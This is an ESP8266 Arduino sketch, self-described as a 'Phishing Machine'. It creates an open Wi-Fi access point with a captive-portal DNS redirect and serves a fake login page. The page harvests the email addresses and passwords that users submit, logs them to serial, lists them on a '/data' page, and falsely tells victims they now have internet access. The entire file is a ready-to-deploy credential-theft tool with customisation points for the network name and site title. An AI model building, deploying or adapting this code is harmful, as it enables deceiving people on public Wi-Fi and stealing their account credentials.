#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

#include "ArrayList.h"

#ifndef APSSID
#define APSSID "ESP-Kubino" //Name of WIFI <------------------------|YOU CAN CHANGE THIS|
#define APPSK  "" //Password from WIFI (Leave blank for public WIFI) <------------------------|YOU CAN CHANGE THIS|
#endif

String nameOfSite = "Not Phishing Site"; //Here you can rename your site name <------------------------|YOU CAN CHANGE THIS|

const char *ssid = APSSID;
const char *password = APPSK;

ArrayList *email = new ArrayList("");
ArrayList *pass = new ArrayList("");

String ver = "1.1"; //DON'T CHANGE THIS OTHERWISE THE SCRIPT WOULDN'T WORK!!!

IPAddress local_ip(192, 168, 1, 1);
IPAddress gateway(192, 168, 1, 1);
IPAddress subnet(255, 255, 255, 0);

const byte DNS_PORT = 53;
DNSServer dnsServer;

ESP8266WebServer server(80);

void handleRoot() {
  server.send(200, "text/html", SendHTML());
}

void handleSave() {
  if (!server.arg("email").isEmpty() || !server.arg("pass").isEmpty()) {
    String emailStr = server.arg("email");
    char * bufEmail = new char[emailStr.length()+1];
    emailStr.toCharArray(bufEmail, emailStr.length()+1);
    email->add_string_item(bufEmail);
    String passStr = server.arg("pass");
    char * bufPass = new char[passStr.length()+1];
    passStr.toCharArray(bufPass, passStr.length()+1);
    pass->add_string_item(bufPass);
    Serial.println();
    Serial.println("o-------------------o");
    Serial.println("|New Input Detected!|");
    Serial.println("o-------------------o");
    Serial.println();
    Serial.print("Email: ");
    Serial.println(emailStr);
    Serial.print("Pass: ");
    Serial.println(passStr);
    server.send(200, "text/html", ShowFakeHTML());
  }
  else {
    server.send(200, "text/html", InvalidHTML());
  }
}

void handleData() {
  server.send(200, "text/html", ShowDataHTML());
}

void setup() {
  //Setup
  Serial.begin(115200);
  delay(1000);
  Serial.println();
  Serial.println("o--------------------------------------o");
  Serial.println("|ESP-8266 Phishing Machine by Kubino <3|");
  Serial.println("o--------------------------------------o");
  Serial.println();
  if (ver != "1.1") {
    Serial.println("o--------------------------------------o");
    Serial.println("|                ERROR                 |");
    Serial.println("| Invalid version! Disabling script... |");
    Serial.println("o--------------------------------------o");
    return;
  }
  Serial.print("Starting ESP-8266 with version: ");
  Serial.println(ver);
  delay(2000);
  Serial.println("Successfully started!");
  //WIFI Setup
  Serial.println("Creating AP...");
  boolean result = WiFi.softAP(ssid, password);
  if (result == true)
  {
    WiFi.softAPConfig(local_ip, gateway, subnet);
    Serial.println("AP was created successfully!");
  }
  else
  {
    Serial.println("AP creation failed!");
  }
  //Web Setup
  Serial.println("Starting Web Server...");
  dnsServer.start(DNS_PORT, "*", local_ip);
  server.on("/", handleRoot);
  server.on("/save", handleSave);
  server.on("/data", handleData);
  server.onNotFound(handleRoot);
  server.begin();
  IPAddress myIP = WiFi.softAPIP();
  Serial.print("Web server is now running on IP: ");
  Serial.println(myIP);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}

String ShowDataHTML() {
  String ptr = "<!DOCTYPE html>\n";
  ptr += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  ptr += "<style>html { font-family: Helvetica; display: inline-block; margin: 0px auto; text-align: center;}</style>\n";
  ptr += "<h1>Database</h1>\n";
  ptr += "<p>Here you can see all data of your users!</p>\n";
  ptr += "<p> </p>\n";
  int emailLength = email->get_size();
  for (int i = 1; i < emailLength; i++) {
    ptr += "<p>Email: <b>";
    String emailString(email->get_item(i));
    ptr += emailString;
    ptr += "</b> Pass: <b>";
    String passString(pass->get_item(i));
    ptr += passString;
    ptr += "</b></p>\n";
  }
  return ptr;
}

String SendHTML() {
  String ptr = "<!DOCTYPE html>\n";
  ptr += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  ptr += "<head>\n";
  ptr += "<title>Not Phishing Site</title>\n";
  ptr += "<style>\n";
  ptr += "*{\n";
  ptr += "margin: 0;\n";
  ptr += "padding: 0;\n";
  ptr += "box-sizing: border-box;\n";
  ptr += "}\n";
  ptr += "body{\n";
  ptr += "min-height: 100vh;\n";
  ptr += "backgroud: #eee;\n";
  ptr += "display: flex;\n";
  ptr += "font-family: sans-serif;\n";
  ptr += "}\n";
  ptr += ".container{\n";
  ptr += "margin: auto;\n";
  ptr += "width: 500px;\n";
  ptr += "max-width: 90%;\n";
  ptr += "}\n";
  ptr += ".container form{\n";
  ptr += "width: 100%;\n";
  ptr += "height: 100%;\n";
  ptr += "padding: 20px;\n";
  ptr += "background: white;\n";
  ptr += "border-radius: 4px;\n";
  ptr += "box-shadow: 0 8px 16px rgba(0,0,0,.3);\n";
  ptr += "}\n";
  ptr += ".container form h1{\n";
  ptr += "text-align: center;\n";
  ptr += "margin-bottom: 24px;\n";
  ptr += "color: #222;\n";
  ptr += "}\n";
  ptr += ".container form .form-control{\n";
  ptr += "width: 100%;\n";
  ptr += "height: 40px;\n";
  ptr += "background: white;\n";
  ptr += "border-radius: 4px;\n";
  ptr += "border: 1px solid silver;\n";
  ptr += "margin: 10px 0 18px 0;\n";
  ptr += "pading: 0 10px;\n";
  ptr += "}\n";
  ptr += ".container form .btn{\n";
  ptr += "margin-left: 50%;\n";
  ptr += "transform: translateX(-50%);\n";
  ptr += "width: 120px;\n";
  ptr += "height: 34px;\n";
  ptr += "border: none;\n";
  ptr += "outline: none;\n";
  ptr += "background: #27a327;\n";
  ptr += "cursor: pointer;\n";
  ptr += "font-size: 16px;\n";
  ptr += "text-transform: uppercase;\n";
  ptr += "color: white;\n";
  ptr += "border-radius: 4px;\n";
  ptr += "transition: .3s;\n";
  ptr += "}\n";
  ptr += ".container form .btn:hover{\n";
  ptr += "opacity: .7;\n";
  ptr += "}\n";
  ptr += "</style>\n";
  ptr += "</head>\n";
  ptr += "<body>\n";
  ptr += "<div class='container'>\n";
  ptr += "<form action='/save'>\n";
  ptr += "<h1>";
  ptr += nameOfSite;
  ptr += "</h1>\n";
  ptr += "<div class='form-group'>\n";
  ptr += "<label for='email'>Email: </label>\n";
  ptr += "<input type='email' class='form-control' required id='email' name='email'>\n";
  ptr += "</div>\n";
  ptr += "<div class='form-group'>\n";
  ptr += "<label for='pass'>Password: </label>\n";
  ptr += "<input type='password' class='form-control' required id='pass' name='pass'>\n";
  ptr += "</div>\n";
  ptr += "<input type='submit' class='btn' value='Log In'>\n";
  ptr += "</body>\n";
  return ptr;
}

String ShowFakeHTML() {
  String ptr = "<!DOCTYPE html> <html>\n";
  ptr += "<style>html { font-family: Helvetica; display: inline-block; margin: 0px auto; text-align: center;}</style>\n";
  ptr += "<head><h1>You are now logged in!</h1></head>\n";
  ptr += "<body><p>You can now use internet...</p>\n";
  ptr += "</body></html>\n";
  return ptr;
}

String InvalidHTML() {
  String ptr = "<!DOCTYPE html> <html>\n";
  ptr += "<style>html { font-family: Helvetica; display: inline-block; margin: 0px auto; text-align: center;}</style>\n";
  ptr += "<head><h1>Please input all fields!</h1></head>\n";
  ptr += "<body><p>Please input all fields for internet access...</p>\n";
  ptr += "</body></html>\n";
  return ptr;
}
